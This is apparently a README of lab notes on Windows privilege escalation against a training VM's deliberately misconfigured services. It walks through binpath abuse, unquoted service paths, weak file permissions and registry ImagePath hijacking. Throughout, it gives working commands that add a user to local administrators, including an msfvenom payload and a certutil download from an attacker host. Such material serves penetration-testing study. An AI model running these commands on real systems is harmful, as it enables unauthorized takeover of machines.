# Windows-PrivEsc



## Binpath

1. ```accesschk64.exe -wuvc daclsvc```
![0](images/binpath/1.png)
Notice that the output suggests that the user has the “SERVICE_CHANGE_CONFIG” permission.

2. ```sc config daclsvc binpath= "net localgroup administrators user /add"```
![0](images/binpath/2.png)

3. ```sc start daclsvc```

4. ![0](images/binpath/3.png)

## Unquoted path

1. ```sc qc unquotedsvc```
![0](images/unquote/1.png)

2. Create a executable file with name "common" so when
 ```msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe```
![0](images/unquote/2.png)

3. Transfer the file to windows machine 
```certutil.exe -urlcache -f http://192.168.43.97:8000/common.exe common.exe```
and move it into "C:\Program Files\Unquoted Path Service"

4. ```sc start unquotedsvc```
![0](images/unquote/3.png)

5. ![0](images/unquote/4.png)

## Fileperm

1. ```sc qc filepermsvc```
![0](images/fileperm/1.png)

2. ```accesschk64.exe "C:\Program Files\File Permissions Service\filepermservice.exe"```
![0](images/fileperm/2.png)

3. Now the transfer the windows_service.c file from C:\Users\user\Desktop\Tools\Source folder to your attacker machine and edit it like following.

![0](images/reg/4.png)

4. Now compile it into an executable and transfer back to windows machine.
```x86_64-w64-mingw32-gcc windows_service.c -o filepermservice.exe```

5. ```copy /y c:\Temp\filepermservice.exe "c:\Program Files\File Permissions Service\filepermservice.exe"```

6. ```sc start filepermsvc```

## Services (Registry)
1. Getting a Powershell from initial shell.
![0](images/reg/1.png)
![0](images/reg/2.png)

2. 
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
![0](images/reg/3.png)

3. Now the transfer the windows_service.c file from C:\Users\user\Desktop\Tools\Source folder to your attacker machine and edit it like following.

![0](images/reg/4.png)

4. Now compile it into an executable and transfer back to windows machine.
```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

5. Copy it to C:\Temp directory

6. Now run the following command 
```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f```

![0](images/reg/5.png)

7. ```sc start regsvc```

8. Check 

![0](images/reg/6.png)
